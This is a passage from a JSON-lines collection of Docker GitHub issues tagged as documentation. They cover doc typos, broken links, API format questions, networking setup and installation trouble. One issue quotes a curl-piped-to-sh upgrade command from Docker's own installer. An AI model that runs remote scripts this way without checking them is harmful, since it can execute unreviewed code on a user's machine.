so I tried it out, getting a ton of errors with socket files. Then I started getting weird errors if a layer was deleting from another layer on buildtime. Switching to ext4 as backing filesystem instead of xfs for the overlay driver solved that. \nIt's confusing to need to dig down all this old issues to figure out that this are mostly known issues.\nIt's also confusing to go from devicemapper (loop) > devicemapper (thin) > overlayfs (with xfs) > overlayfs (with ext4).\n\nThe best that worked for me (less buggy) was actually devicemapper, both loop and thin.\n\nWhat is the \"at the time\" best option? Whats the pros and cons?\nMaybe this should be a part of the documentation that is updated from time to time. A matrix-style overview.\n"},{"labels":["documentation",null],"text":"For installing docker on cloud platforms we want to direct people to install machine and then deploy docker. \n\n@londoncalling I'd like you to do this update.  \n\ncc @shykes \n"},{"labels":["documentation",null],"text":"Hi, I have the latest win 10 build and got some problems following the guide:\n\nAdd ssh.exe to your PATH\n$Env:Path = \"${Env:Path};c:\\Program Files (x86)\\Git\\bin\"\n\nshould be\n\n$Env:Path = \"${Env:Path};c:\\Program Files (x86)\\Git\\bin;C:\\Program Files\\Git\\mingw64\\bin\"\n\nand the \"eval\" command isn't working in my PS. I setuped the ENV variables by hand\n"},{"labels":["documentation"],"text":"User asked on Stackoverflow.\n\nhttp://stackoverflow.com/questions/33784295/setting-dns-for-docker-daemon-using-systemd-drop-in\n"},{"labels":["documentation",null],"text":"I'm using the debian package from https://apt.dockerproject.org/repo/ on version 1.9.0-0~vivid and the --volume-driver option is not documented in the man page. It appears in the `docker run --help` but not in `man docker run`.\n"},{"labels":["documentation"],"text":"https://docs.docker.com/engine/userguide/networkingcontainers/ - one of the examples is missing --format (or -f) parameter.  In the \"Add containers to a network\" section, after the words:\n\"Then, get the IP address of your web\", there is an example:\n\n```\n$ docker inspect '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' web\n```\n\nIt should be, similar to the one above:\n\n```\n$ docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' web\n```\n\notherwise the user gets an error:\n\n```\n$ docker inspect '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' certsignd\nError: No such image or container: {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\n```\n\nand a very long JSON blob with the full config.\n"},{"labels":["documentation"],"text":"Title says it all\n"},{"labels":["documentation"],"text":"Being able to install a specific version of docker is a recurring question (see for example https://github.com/docker/docker/issues/9697, https://github.com/docker/docker/issues/13191, https://github.com/docker/docker/issues/13822, https://github.com/docker/docker/issues/15581, https://github.com/docker/docker/issues/15586, https://github.com/docker/docker/issues/15947)\n\nWe currently describe how to download a specific (static) binary on http://docs.docker.com/engine/installation/binaries/, but don't provide that information on how to do this using apt, yum, or dnf.\n\nWhile this may be \"general knowledge\" on working with package managers, it would be a nice addition to explain users how to do this (and how to \"pin\" to a specific major/minor version)\n\nfor example, on ubuntu\n\n``` bash\napt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\nmkdir -p /etc/apt/sources.list.d\necho deb https://apt.dockerproject.org/repo3 ubuntu-trusty main > /etc/apt/sources.list.d/docker.list\napt-get update;\napt-get install -y -q docker-engine=1.x.x~\n```\n"},{"labels":["documentation"],"text":"The page https://docs.docker.com/engine/articles/security/#linux-kernel-capabilities links to the removed https://github.com/docker/docker/blob/master/daemon/execdriver/native/template/default_template.go instead of https://github.com/docker/docker/blob/master/daemon/execdriver/native/template/default_template_linux.go.\n## Possible solution to the maintenance problem\n\nYou might want to use a link to a specific version (which is never going to break) and update it as needed/wanted; if updates are forgotten, users can at least try to navigate through to a more recent version. Additionally, when pointing to a specific version, it becomes possible to link to specific lines _robustly_, that is, without having to update line numbers at each change.\n\nhttps://github.com/docker/docker/blob/87de5fdd5972343a11847922e0f41d9898b5cff7/daemon/execdriver/native/template/default_template_linux.go#L16-L29\n"},{"labels":["documentation",null],"text":"In this page: http://docs.docker.com/engine/userguide/dockerimages/\n\nInstead of \"Tip: You recommend you always use a specific tagged image, for example ubuntu:12.04. That way you always know exactly what variant of an image is being used.\", it should be \"Tip: We recommend you always use a specific tagged image, for example ubuntu:12.04. That way you always know exactly what variant of an image is being used.\"\n"},{"labels":["documentation"],"text":"I'm on a Mac OS X and following the [Get started with multi-host networking](https://docs.docker.com/engine/userguide/networking/get-started-overlay/) tutorial:\n\nIn Step 2, the following command fails after 60 retries:\n\n```\n$ docker-machine create \\\n-d virtualbox \\\n--swarm --swarm-image=\"swarm\" --swarm-master \\\n--swarm-discovery=\"consul://$(docker-machine ip mh-keystore):8500\" \\\n--engine-opt=\"cluster-store=consul://$(docker-machine ip mh-keystore):8500\" \\\n--engine-opt=\"cluster-advertise=eth1:2376\" \\\nmhs-demo0\n```\n\nwhen I add `--debug`, I see:\n\n```\n...\nDaemon not responding yet: dial tcp 192.168.99.101:2376: connection refused\nDaemon not responding yet: dial tcp 192.168.99.101:2376: connection refused\nDaemon not responding yet: dial tcp 192.168.99.101:2376: connection refused\n...\n```\n\nBut I can actually connect to this engine from my host machine (Mac OS X) like:\n\n```\n$ docker ...  '-H=tcp://192.168.99.100:2376' ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                            NAMES\nfdc11fc1609c        progrium/consul     \"/bin/start -server -\"   19 minutes ago      Up 19 minutes       53/tcp, 53/udp, 8300-8302/tcp, 8400/tcp, 8301-8302/udp, 0.0.0.0:8500->8500/tcp   nostalgic_visvesvaraya\n```\n# Debug info\n\n```\n➜  ~  docker info\nContainers: 1\nImages: 18\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 20\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.0.9-boot2docker\nOperating System: Boot2Docker 1.8.1 (TCL 6.3); master : 7f12e95 - Thu Aug 13 03:24:56 UTC 2015\nCPUs: 1\nTotal Memory: 996.2 MiB\nName: mh-keystore\nID: ZCBE:XISI:3ZBC:NDXW:ASIH:V6RI:CON4:VNVJ:LOHU:LZ4S:6Q4D:KETE\nDebug mode (server): true\nFile Descriptors: 15\nGoroutines: 27\nSystem Time: 2015-11-09T23:31:18.109537018Z\nEventsListeners: 0\nInit SHA1:\nInit Path: /usr/local/bin/docker\nDocker Root Dir: /mnt/sda1/var/lib/docker\nUsername: ahmet\nRegistry: https://index.docker.io/v1/\nLabels:\n provider=virtualbox\n\n➜  ~  docker version\nClient:\n Version:      1.8.1\n API version:  1.20\n Go version:   go1.5\n Git commit:   d12ea79\n Built:        Mon Aug 31 22:27:45 UTC 2015\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      1.8.1\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   d12ea79\n Built:        Thu Aug 13 02:49:29 UTC 2015\n OS/Arch:      linux/amd64\n```\n\n```\n➜  ~  docker-machine -v\ndocker-machine version 0.4.1 (e2c88d6)\n```\n"},{"labels":["documentation",null],"text":"We should use on-premises not on-premise.\n"},{"labels":["documentation"],"text":"I just installed docker on my laptop with Ubuntu 14.04 and I just got a big scare, as my system ran out of space, and kept using all the space I did free.\nThis was due to /var/lib/docker/aufs/timeshift using up everything.\nIt turns out by default timeshift does not skip /var/lib, so one has to add an explicit exclusion.\nNot docker fault, but it would be good to have an \"head's up\" somewhere, in the installation info for ubuntu.\n"},{"labels":["documentation"],"text":"This is just hanging there in an odd place.\n\nhttp://docs.docker.com/engine/userguide/labels-custom-metadata/\n"},{"labels":["documentation"],"text":"Add Adam/Betty's list to docs.\n"},{"labels":["documentation",null],"text":"Looks like some code was removed in #17700 but not entirely removed throughout the docs.  Verify the docs were cleaned properly.\n"},{"labels":["documentation"],"text":"I was reading through the contribution documentation, and under the section https://github.com/docker/docker/blob/master/CONTRIBUTING.md#design-and-cleanup-proposals, there's a link to http://docs.docker.com/opensource/project/advanced-contributing/ for advanced contributor details. That link leads to a blank page (not a 404 - just a blank page).\n\nWanted to let y'all know about the broken link as well as ask where I could find the details on how you're asking folks to present design and refactor concepts to the project.\n\nThanks!\n\n-joe\n"},{"labels":["documentation",null,null],"text":"I started to experiment with volume plugins yesterday, had a bunch of questions, pestered my coworkers, tortured my Docker Engine, got answers, and here's some feedback (pre @thaJeztah's request).\n## How can I use two different plugins?\n\nWhen reading the docs, I wondered how I could start a container using two volumes with two different drivers. The [volume plugins docs](http://docs.docker.com/engine/extend/plugins_volume/) say nothing about this, nor do the `docker run` page.\n\nThe answer is to create the volumes separately with `docker volume` and then start the container.\n## Impact on `VOLUME`\n\nThen I wondered: \"since I have to use `docker volume`, do we really need `--volume-driver`, then?\" and it was pointed out that `--volume-driver` will be used for the implicit `VOLUME`s defined in the Dockerfile.\n\nI think the docs should also clarify that.\n## Terminology\n\nIt could be useful to clarify what is a `plugin` and what is a `driver`. Are they interchangeable, or is there a subtlety? (Like, \"a plugin can provide multiple drivers\" maybe?)\n"},{"labels":["documentation",null],"text":"Need to document the exact  required TCP/UDP ports to be open in order for overlay networks to work:\n\nengine port (e.g TCP 2376), \nvxlan: UDP 4789\nserf: TCP + UDP 7946\nkey-value store ( e.g for consul TCP 8500) \n\nAdditionally, in `Understand Docker container networks`\nneed to edit `--cluster-advertise=HOST_IP` and make it `--cluster-advertise=HOST_IP:ENGINE_PORT` or `--cluster-advertise=HOST_INTERFACE:ENGINE_PORT` \n"},{"labels":["documentation",null],"text":"Just worked through the examples at https://docs.docker.com/engine/userguide/networking/get-started-overlay/ and have the following corrections/suggestions:\n\nStep 2.2 - should this now just be --swarm-image=\"swarm\" rather than --swarm-image=\"swarm:1.0.0-rc2\" ?\n\nStep 4 - given that constraints are specified, any reason why the docker run commands are targeted at the individual nodes rather than the swarm master?\n\nStep 6.3 - doesn't indicate that the file needs to be in a directory called counter\nStep 6.4 - specifies a node constraint that is not consistent with those created earlier in the article\nStep 6.6 - has an extraneous 'up' after 'docker-compose' which is hard to diagnose from the usage instructions that you then get back given that the experimental option is not documented\nStep 6.x - would be good to have a final step to browse to the app\n"},{"labels":["documentation",null],"text":"The manual installation procedure for ubuntu doesn't install the requirements for aufs. we should add it to the requirements, because aufs is our recommended/default driver on ubuntu\n"},{"labels":["documentation"],"text":"Just built the latest version of the docs and noticed minor update would be required to [Organize our issues page](http://docs.docker.com/opensource/ways/issues/) for missing reference to `Windows` platform. Jump to section ===> `How Do I triage ?`\n\n```\nkitematic/kitematic     Kitematic is a simple application for managing Docker containers on Mac OS X.\n```\n\nshould be replaced to \n\n```\nkitematic/kitematic     Kitematic is a simple application for managing Docker containers on Mac OS X and Windows.\n```\n"},{"labels":["documentation",null],"text":"Hi ,\nI am using docker remote api version 1.19 and using below request to pull image. \nPOST /images/create?fromImage=ubuntu HTTP/1.1\n\nAbove request have Content-Type: application/json but it is not returning a valid json.\nIn case of wrong image it return \n{\"status\":\"Pulling repository docker.io/library/cento\"}\n{\"errorDetail\":{\"message\":\"Error while pulling image: Get https://index.docker.io/v1/repositories/library/cento/images: dial tcp: lookup index.docker.io: no such host\"},\"error\":\"Error while pulling image: Get https://index.docker.io/v1/repositories/library/cento/images: dial tcp: lookup index.docker.io: no such host\"}\n\nwhich is not a valid json so i am unable to send the proper response.\n"},{"labels":["documentation",null],"text":"Add more detail in Docs about each event state shown in this diagram: http://docs.docker.com/reference/api/docker_remote_api/#docker-events\n\nCloses #10654\n"},{"labels":["documentation",null,null],"text":"Please refer to #17205 \n\nThe documentation should be updated to differentiate between SystemD and normal init scripts when configuring changes to the startup options for docker.\n"},{"labels":["documentation"],"text":"I followed the site https://docs.docker.com/articles/https/\nbut at the end , docker --tlsverify ps  return an erro \n\n```\nAn error occurred trying to connect: Get https://xxxxx/v1.20/containers/json: x509: certificate signed by unknown authority\n```\n\nIf i test the same URL with CURL:\ncurl https://xxxxx/images/json   --cert ~/.docker/cert.pem   --key ~/.docker/key.pem   --cacert ~/.docker/ca.pem\n\nit return Json info.\n\nHow can i use TLS conf with auto signed CA?\n"},{"labels":["documentation",null],"text":"This page has a broken link https://docs.docker.com/userguide/image_management/ - links to https://docs.docker.com/dockter-trusted-registry but should https://docs.docker.com/docker-trusted-registry\n"},{"labels":["documentation",null],"text":"https://docs.docker.com/installation/ubuntulinux/\n\nThis:\n\n```\n$ apt-key adv --keyserver hkp://pgp.mit.edu:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\n```\n\nShould be:\n\n```\n$ sudo apt-key adv --keyserver hkp://pgp.mit.edu:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\n```\n\nAnd `sudo usermod -aG docker ubuntu` is listed under optional configurations, but that step is most definitely required.\n"},{"labels":["documentation"],"text":"The [names-generator states](https://github.com/docker/docker/blob/ab31d9500ebe0c3bf039321bb8c83c7b01c21e4e/pkg/namesgenerator/names-generator.go#L76-L77);\n\n```\n// Docker, starting from 0.7.x, generates names from notable scientists and hackers.\n// Please, for any amazing man that you add to the list, consider adding an equally amazing woman to it, and vice versa.\n```\n\nWe may want to be more specific about what we consider \"notable\", and what \"rules\" we use when adding people to this list. This came up a few times in the past, i.e. \"being a CEO or founder of a company\" does not per-definition make a person \"notable\".\n\nFor reference, see the discussion in https://github.com/docker/docker/pull/17156 and https://github.com/docker/docker/pull/15218#discussion_r36033279\n"},{"labels":["documentation"],"text":"Links are being deprecated with the implementation of the new networking material. We need to update the `trust_sandbox.md` example to use docker networking rather than links.\n\nping @endophage  @NathanMcCauley @diogomonica \n"},{"labels":["documentation",null,null],"text":"![image](https://cloud.githubusercontent.com/assets/1347209/10561981/fc412bd8-74f8-11e5-83ef-034953b5454e.png)\n"},{"labels":["documentation",null],"text":"The current \"usage\" for commands is in many cases not very helpful, for example if I want to see which filters are supported for `docker ps`:\n\n``` bash\n$ docker ps --filter\nflag needs an argument: --filter\nSee 'docker ps --help'.\n\n$ docker ps --help\n\nUsage:  docker ps [OPTIONS]\n\nList containers\n\n  -a, --all=false       Show all containers (default shows just running)\n  --before=             Show only container created before Id or Name\n  -f, --filter=[]       Filter output based on conditions provided\n  --format=             Pretty-print containers using a Go template\n  --help=false          Print usage\n  -l, --latest=false    Show the latest created container, include non-running\n  -n=-1                 Show n last created containers, include non-running\n  --no-trunc=false      Don't truncate output\n  -q, --quiet=false     Only display numeric IDs\n  -s, --size=false      Display total file sizes\n  --since=              Show created since Id or Name, include non-running\n```\n\nThe information does not give any clue what filters are available.\n\nWe should try to improve this output and, if possible, reuse the existing documentation (man-pages, docs) to prevent having to maintain this information in three locations (usage, man-page, docs).\n"},{"labels":["documentation"],"text":"Move the how to contribute to open source documentation to the opensource project.\n"},{"labels":["documentation"],"text":"The `GET /volumes` remote api [query parameter](https://github.com/docker/docker/blob/master/api/server/router/local/volume.go#L17) \"**filters**\" (plural) is consistent with similar list commands (e.g. `GET /images`), but the [v1.21 docs](https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.21.md#list-volumes) state that the parameter is named \"**filter**\" (singular).\n\nWhich one is correct? I guess the docs are wrong, and if so, I could provide a PR to fix them. If the docs are right and the param was meant to be **filter** (singular), I'd like to discuss about consistency to the other endpoints ;-)\n"},{"labels":[null,"documentation"],"text":"[The docker-maven-plugin](https://github.com/spotify/docker-maven-plugin) can be used for Maven projects to push an image to the user's configured Docker registry at certain points in the build process. The plugin uses [the docker-client library](https://github.com/spotify/docker-client), which communicates with the docker daemon using the Remote API.\n\nWhen pushing an image, we would like for the plugin to be able to be aware of the registry-assigned digest for the image, so that it can be communicated to downstream plugins / build steps.\n\ndocker-client tries to find the image digest by basically grepping through the JSON status messages sent by the /push endpoint. We (docker-maven-plugin maintainers) [discovered that in docker v1.8 the format of the message changed](https://github.com/spotify/docker-client/issues/250) from\n\n```\nDigest: sha256:dbad7f727f340f4bfa1160689eaf57a60242bf9a48cc2c4c14f383c9b66e8f06\n```\n\nto something like \n\n```\n0.2.1-SNAPSHOT-efd3f71.DIRTY: digest: sha256:8138f3c93c333aa1db6634ae77fce1a50febb9b189ba6fb2121f22810b7841b3 size: 41358\n```\n1. Would it be possible to document the format of the status message containing the image digest to make it less susceptible to unintended changes in future docker versions?\n2. Is there a smarter way for the docker-client library to get the image digest after/during a push?\n"},{"labels":["documentation"],"text":"I followed the installation steps at https://docs.docker.com/installation/debian/ for Debian Wheezy. However, I was unable to install the package docker-engine because of this error:\n\n`The following packages have unmet dependencies: docker-engine : Depends: init-system-helpers (>= 1.18~) but it is not installable`\n\nIn issue https://github.com/docker/machine/issues/1607 I read that if support for Wheezy is requested, an issue should be openend - which I'm doing with this.\n\nWe have a large cluster currently running many Debian Wheezy machines. They won't be upgraded to Debian 8 in the foreseeable future, so support for Debian 7 would be highly appreciated.\n"},{"labels":["documentation"],"text":"Reported by \"univahpollinger\" on IRC; ([logs](https://botbot.me/freenode/docker-dev/msg/51414351/);\n\n> I'm running Docker 1.8.2 and use the RemoteAPI. The response on a \"GET /containers/<id>/stats\" request contains a \"precpu_stats\" field - this is not documented, but is the exact copy of the \"cpu_stats\" field - is the \"precpu_stats\" field intended - what is this then? - or is it just a copy&paste error in the code?\n\nPR https://github.com/docker/docker/pull/13320 introduced a `precpu_stats` field in the stats, but this field has not been documented\n\nping @coolljt0725 :smile:\n"},{"labels":["documentation",null],"text":"The \"configuring docker\" section is not updated to reflect the new packages, which no longer use /etc/sysconfig/docker on SystemD; https://docs.docker.com/engine/articles/configuring/#configuring-docker-1\n\nInstallation articles duplicate a lot of this same content.  Updating this should include fixing that material; we might want to update the installs to link to configuring rather than having a lot of material duplicated all around.\n\nSee #16662 for the origination story behind this issue\n"},{"labels":["documentation"],"text":"```\nubuntu@server:~$ docker version\nClient version: 1.7.1\nClient API version: 1.19\nGo version (client): go1.4.2\nGit commit (client): 786b29d\nOS/Arch (client): linux/amd64\nServer version: 1.7.1\nServer API version: 1.19\nGo version (server): go1.4.2\nGit commit (server): 786b29d\nOS/Arch (server): linux/amd64\n\nubuntu@server:~$ docker info\nContainers: 8\nImages: 63\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 79\n Dirperm1 Supported: false\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 3.13.0-58-generic\nOperating System: Ubuntu 14.04.2 LTS\nCPUs: 2\nTotal Memory: 3.859 GiB\nName: ************\nID: 36XS:MMPO:MGBK:EEKA:T2UF:QJKH:FROW:EARP:G7MJ:ATXF:C3WT:5ZTQ\nWARNING: No swap limit support\n\nubuntu@server:~$ uname -a\nLinux ************ 3.13.0-58-generic #97-Ubuntu SMP Wed Jul 8 02:56:15 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n```\n# Steps to reproduce the issue:\n1. Open the official \"Installation on Ubuntu\" documentation page\n2. Go to the Upgrade section https://docs.docker.com/installation/ubuntulinux/#upgrade-docker\n3. Run the suggested command in order to upgrade from 1.7.1 to the current stable version (1.8.2)\n   \n   `$ curl -sSL https://get.docker.com/ | sh`\n\nI received the following message:\n`Warning: the \"docker\" command appears to already exist on this system.\nIf you already have Docker installed, this script can cause trouble, which is\nwhy we're displaying this warning and provide the opportunity to cancel the\ninstallation.\nIf you installed the current Docker package using this script and are using it\nagain to update Docker, you can safely ignore this message.\nYou may press Ctrl+C now to abort this script.`\n\nWhat I expected:\nI've discovered that I've installed version 1.7.1 using the following command (please see the `/ubuntu` at the end):\n`$ curl -sSL https://get.docker.com/ubuntu | sh`\n\nIf I try to re-run the original command (the one with `/ubuntu`) nothing happens, the version stays at 1.7.1, so I can guess that the new command (the one without `/ubuntu`) is the only one able to perform the upgrade, but it is suggesting me to stop it using CTRL+C because the original installation were not performed using such a script.\n\nIn the end the issue is: I don't know how to proceed because neither the script nor the documentation page are suggesting me what to do in order to upgrade Docker. The only suggestion is to perform CTRL+C and stay with version 1.7.1.\n"},{"labels":["documentation"],"text":"When looking at the [remote API](https://docs.docker.com/reference/api/docker_remote_api_v1.20/), I noticed the links for the versions is sorted incorrectly:\nv1.20 --> v1.21 --> v1.19\n\n![screen shot 2015-10-01 at 8 32 38 pm](https://cloud.githubusercontent.com/assets/679475/10239004/b2adfcc8-687b-11e5-9480-e897eca64f6e.png)\n\nTried looking at the docs in Github, but not sure where this resides?\n"},{"labels":["documentation",null,null],"text":"https://docs.docker.com/reference/commandline/ps/\n\nThe placeholder .Names is missing in available placeholders for\n\n```\ndocker ps  --format\n```\n\n```\nClient:\n Version:      1.8.2\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   0a8c2e3\n Built:        Thu Sep 10 19:21:21 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.8.2\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   0a8c2e3\n Built:        Thu Sep 10 19:21:21 UTC 2015\n OS/Arch:      linux/amd64\n```\n"},{"labels":["documentation",null],"text":"The Dockerfile documentation about the EXPOSE directive states it is used \"to determine which ports to expose to the host when using the -P flag.\"\n\nThen, it goes on to say:\n\n\"Note: EXPOSE doesn’t define which ports can be exposed to the host or make ports accessible from the host by default.\"\n\nIt seems to me the first statement is wrong and should be removed, because AFAIK EXPOSE does not determine which ports to expose to the host.  If I'm wrong about that, than the documentation should be updated with clarification.  \n"},{"labels":["documentation"],"text":"Was open here, but not fixed #3622\n\nThe documentation still don't give any examples on how this works!\n\nhttps://docs.docker.com/reference/api/docker_remote_api_v1.20/#create-a-container\n"},{"labels":["documentation"],"text":"https://twitter.com/scott_lowe/status/647174608844640256\n\nhttps://blog.docker.com/2015/07/new-apt-and-yum-repos/\n"},{"labels":["documentation",null,null],"text":"Description of problem:\nNeither the documentation itself nor the examples in the Remote API documentation (specifically for v1.20, https://docs.docker.com/reference/api/docker_remote_api_v1.20/ ) mention that the \"Content-Length\" field is necessary in all POST requests that have a body.\nThe value in this field is not exactly important, at least as it is larger or equal to the actual body size.\n\n`docker version`:\nClient:\n Version:      1.8.2\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   0a8c2e3\n Built:        Thu Sep 10 19:19:00 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.8.2\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   0a8c2e3\n Built:        Thu Sep 10 19:19:00 UTC 2015\n OS/Arch:      linux/amd64\n\n`docker info`:\nContainers: 98\nImages: 9\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 211\n Dirperm1 Supported: false\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 3.13.0-63-generic\nOperating System: Ubuntu 14.04.3 LTS\nCPUs: 4\nTotal Memory: 7.664 GiB\nName: sirius.mydomain.test\nID: OKAA:4QF6:6QJ4:R4SE:IWFG:YJLY:PFFW:YTEK:URCB:MTCV:QCOY:VP3Y\nWARNING: No swap limit support\n\n`uname -a`:\nLinux sirius.mydomain.test 3.13.0-63-generic #103-Ubuntu SMP Fri Aug 14 21:42:59 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n\nEnvironment details (AWS, VirtualBox, physical, etc.):\nPhysical\n\nHow reproducible:\nAlways\n\nSteps to Reproduce:\n1. Execute the following command line in the terminal\n$ echo -e \"POST /containers/4d50a1065a88/copy HTTP/1.1\\r\\nContent-Type: application/json\\r\\n\\r\\n{\\r\\n\\\"Resource\\\": \\\"test.txt\\\"\\r\\n}\\r\\n\" | sudo nc -U /var/run/docker.sock\n\nActual Results:\nHTTP/1.1 500 Internal Server Error\nContent-Type: text/plain; charset=utf-8\nServer: Docker/1.8.2 (linux)\nDate: Wed, 23 Sep 2015 08:35:54 GMT\nContent-Length: 4\n\nEOF\nHTTP/1.1 400 Bad Request\n\nExpected Results:\nHTTP/1.1 500 Internal Server Error\nContent-Type: text/plain; charset=utf-8\nServer: Docker/1.8.2 (linux)\nDate: Wed, 23 Sep 2015 08:39:53 GMT\nContent-Length: 59\n\nCould not find the file test.txt in container 4d50a1065a88\n\nAdditional info:\nThe expected result is printed with this command line:\n$ echo -e \"POST /containers/4d50a1065a88/copy HTTP/1.1\\r\\nContent-Type: application/json\\r\\nContent-Length: 1000\\r\\n\\r\\n{\\r\\n\\\"Resource\\\": \\\"test.txt\\\"\\r\\n}\\r\\n\" | sudo nc -U /var/run/docker.sock\n"},{"labels":["documentation"],"text":"docker version: Docker version 1.8.2, build 0a8c2e3\nuname: Linux 13.0-63-generic #103-Ubuntu SMP Fri Aug 14 21:42:59 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\n\nI have added the following to my `/etc/init/docker`:\n\n``` bash\nDOCKER_OPTS=\"-H unix:///var/run/docker.sock --log-opt max-size=25m --log-opt max-file=2\"\n```\n\noutput of ps:\n\n```\nroot       928  0.0  0.1 2019352 33980 ?       Ssl  Sep16   4:18 /usr/bin/docker daemon -H unix:///var/run/docker.sock --log-opt max-size=25m --log-opt max-file=2\n```\n\n```\nroot@[redacted]:/var/lib/docker/containers/4ca6a18d58bb6df9d77d30d64f17d208f3e02b3018888143f51522f2dcf8ddff# ls -lah\ntotal 30M\ndrwx------ 2 root root 4.0K Sep 16 19:47 .\ndrwx------ 9 root root 4.0K Sep 16 18:51 ..\n-rw------- 1 root root  30M Sep 21 14:40 4ca6a18d58bb6df9d77d30d64f17d208f3e02b3018888143f51522f2dcf8ddff-json.log\n-rw-r--r-- 1 root root 3.4K Sep 16 19:47 config.json\n-rw-r--r-- 1 root root  764 Sep 16 19:47 hostconfig.json\n-rw-r--r-- 1 root root   13 Sep 16 19:47 hostname\n-rw-r--r-- 1 root root  638 Sep 16 19:47 hosts\n-rw-r--r-- 1 root root  248 Sep 16 19:47 resolv.conf\n-rw------- 1 root root   71 Sep 16 19:47 resolv.conf.hash\n```\n\n```\nroot@[redacted]:/var/lib/docker/containers/4ca6a18d58bb6df9d77d30d64f17d208f3e02b3018888143f51522f2dcf8ddff# docker ps | grep 4ca6a18d58bb\n4ca6a18d58bb        my-app     \"npm start\"   4 days ago          Up 4 days           3001/tcp, 0.0.0.0:32779->3000/tcp            my_app_1\n```\n"},{"labels":["documentation",null],"text":"The docs (https://docs.docker.com/mac/step_six/) encourage users to enter their Docker Hub passwords in shell commands. This is bad because it exposes the password in clear text in the user's bash history. It would be better to have the user enter his or her password interactively.\n"},{"labels":["documentation",null],"text":"If you look at Docker run reference page at https://docs.docker.com/reference/run/ , the \"Runtime Constraints on CPU and Memory\" link in the Operator exclusive options is broken and \"goes nowhere\": https://docs.docker.com/reference/run/#runtime-constraints-on-cpu-and-memory\n"},{"labels":["documentation"],"text":"In docs/README.md:\nThe ### Generate the man pages section should refer to the README.md document in the man pages instead of referring in general to the man pages directory.\n\nIn man/README.mD:\nThe directory \"/docker\" is used to represent the user's '<'docker-fork'>' directory.. but the readme does not mention this.  Thus, the user may have problems following the instructions provided.\n\nI'll associate a PR with suggested changes.\n"},{"labels":["documentation"],"text":"We need better documentation about choosing a storage driver.  Jerome's presentation is a good place to start.\n"},{"labels":["documentation",null,null],"text":"i think, the follow example on file \n- docker/docs/reference/api/docker_remote_api_v1.21.md\n- docker/docs/reference/api/docker_remote_api_v1.20.md\n- docker/docs/reference/api/docker_remote_api_v1.19.md\n- ...\n\n```\nUlimits: { \"Name\": \"nofile\", \"Soft\": 1024, \"Hard\", 2048 }}\n```\n\nshould be\n\n```\nUlimits: { \"Name\": \"nofile\", \"Soft\": 1024, \"Hard\": 2048 }\n```\n"},{"labels":["documentation",null],"text":"As the Docker website continues to expand, it is going to become increasing difficult to find the information required by navigation alone. \n\neg. To find more information about a particular command, such as docker info, I used the following search string in Google: `docker info site:docs.docker.com`\n\nSee: https://www.python.org/\n"},{"labels":["documentation"],"text":"It seems the systemd service file doesn't load the config file from sysconfig which prevents any docker startup options from taking effect.\n\nDoc reference: https://docs.docker.com/articles/configuring/#configuring-docker-1\n"},{"labels":["documentation",null],"text":"As far as I know, we don't have documentation about how the volume, networking and other external driver proxies are generated. I don't think we have a make command to generate them. We should add documentation and a script to facilitate those tasks.\n"},{"labels":["documentation"],"text":"We don't yet have a style guide or instructions for creating man pages.\n"},{"labels":["documentation",null],"text":"If virtualization (VT-X) is not supported on the hardware that Docker Toolbox / VirtualBox is installed on, the VirtualBox VM will fail to start.\n\nWe should document that;\n- `VT-X` must be supported _and enabled_ on the hardware\n- How to check if `VT-X` is supported and enabled\n- Some basic instructions (or links to) to enable VT-X\n\nI opened an issue in the Docker Toolbox repository to track improvements in the installer; https://github.com/docker/toolbox/issues/166\n\nThis problem is reported in https://github.com/docker/docker/issues/11877, and mentioned in https://github.com/docker/docker/issues/15982#issuecomment-138822418, but there are various reports in the Docker Machine and Docker Toolbox repository as well.\n\n/cc @moxiegirl @jeffdm @ehazlett \n"},{"labels":["documentation",null,null],"text":"I noticed an incomplete sentence on the following link: https://docs.docker.com/articles/basics/. The \"Please\" is not followed by a proper sentence. Thought I'd bring it to your attention!\n\nIf you get docker: command not found or something like/var/lib/docker/repositories: permission denied you may have an incomplete Docker installation or insufficient privileges to access Docker on your machine. Please\n"},{"labels":["documentation",null],"text":"The new labels are now present, as decided on in https://github.com/docker/docker/pull/14719, and described in [project/ISSUE-TRIAGE.md](https://github.com/docker/docker/blob/master/project/ISSUE-TRIAGE.md), so the [\"find an issue\"](https://github.com/docker/docker/blob/master/docs/project/find-an-issue.md) page should be updated to reflect the new labels.\n"},{"labels":["documentation",null],"text":"This page has a typo: https://docs.docker.com/reference/commandline/cp/\n\nthe typo is : SRC_PAPTH => SRC_PATH\n"},{"labels":["documentation"],"text":"The API reference makes several references to the `AuthConfig` structure, but it's not described anywhere as far as I can tell.\n"},{"labels":["documentation",null,null],"text":"This:\n\n`docker run -v /path/to/nonexistent/directory:/container-path ...`\n\nResults in docker creating `/path/to/nonexistent/directory`.  I didn't expect this, and AFAICT, it's undocumented. \n\n`Linux mg-mesos 